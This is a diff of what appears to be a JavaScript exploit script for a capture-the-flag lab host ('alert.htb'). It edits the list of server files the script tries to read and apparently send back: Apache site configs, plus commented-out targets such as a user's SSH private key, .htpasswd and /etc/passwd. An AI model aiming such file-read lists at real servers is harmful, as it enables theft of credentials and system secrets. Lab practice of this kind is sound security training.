@@ -66,27 +66,42 @@ fetch(base_url, {
 //const data = collectData();
 
 const apacheConfigPaths = [
-    // Global Configuration Files
-    "/etc/apache2/apache2.conf",  // Debian, Ubuntu
-    "/etc/apache2/sites-enabled/alert.conf",  // Debian, Ubuntu
-    "/etc/apache2/sites-enabled/alert.htb.conf",  // Debian, Ubuntu
+    "/etc/apache2/sites-available/000-default.conf",
+    "/etc/apache2/sites-enabled/000-default.conf",
+    "/etc/apache2/sites-enabled/alert.conf",
+    "/etc/apache2/sites-enabled/alert.htb.conf",
+    "/etc/apache2/sites-enabled/*",
+    "/etc/apache2/sites-enabled/",
+    "/etc/apache2/sites-available/alert.htb.conf",
+    "/etc/apache2/sites-available/alert.conf",
+    "/etc/apache2/sites-available/"
+    // "/home/albert/.ssh/id_rsa",
+    // "/etc/apache2/.htpasswd"
+    // "/var/log/apache2/access.log"
+    // "/var/www/html/config.php"
+    // "/etc/passwd",
+    // "/var/www/srv",
+    // // Global Configuration Files
+    // "/etc/apache2/apache2.conf",  // Debian, Ubuntu
+    // "/etc/apache2/sites-enabled/alert.conf",  // Debian, Ubuntu
+    // "/etc/apache2/sites-enabled/alert.htb.conf",  // Debian, Ubuntu
 
-    // // SSL Configuration (If enabled)
-     "/etc/httpd/conf.d/ssl.conf",  // CentOS, Red Hat, Fedora
-    "/etc/apache2/sites-available/default-ssl.conf",  // Debian, Ubuntu
+    // // // SSL Configuration (If enabled)
+    //  "/etc/httpd/conf.d/ssl.conf",  // CentOS, Red Hat, Fedora
+    // "/etc/apache2/sites-available/default-ssl.conf",  // Debian, Ubuntu
 
-    // Access and Error Log Configuration
-    "/etc/httpd/logs/access_log",  // CentOS, Red Hat, Fedora
-    "/etc/httpd/logs/error_log",  // CentOS, Red Hat, Fedora
-    "/var/log/apache2/access.log",  // Debian, Ubuntu
-    "/var/log/apache2/error.log",  // Debian, Ubuntu
+    // // Access and Error Log Configuration
+    // "/etc/httpd/logs/access_log",  // CentOS, Red Hat, Fedora
+    // "/etc/httpd/logs/error_log",  // CentOS, Red Hat, Fedora
+    // "/var/log/apache2/access.log",  // Debian, Ubuntu
+    // "/var/log/apache2/error.log",  // Debian, Ubuntu
 
-    // User and Group Configuration
-     "/etc/apache2/envvars",  // Debian, Ubuntu
+    // // User and Group Configuration
+    //  "/etc/apache2/envvars",  // Debian, Ubuntu
 
-    // Potentially risky files for inclusion (not directories or wildcards)
-     "/etc/apache2/httpd.conf",  // Potential RFI if configured with a URL include directive
-     "/etc/httpd/httpd.conf",  // Potential RFI if configured with a URL include directive
+    // // Potentially risky files for inclusion (not directories or wildcards)
+    //  "/etc/apache2/httpd.conf",  // Potential RFI if configured with a URL include directive
+    //  "/etc/httpd/httpd.conf",  // Potential RFI if configured with a URL include directive
 ];
 
 
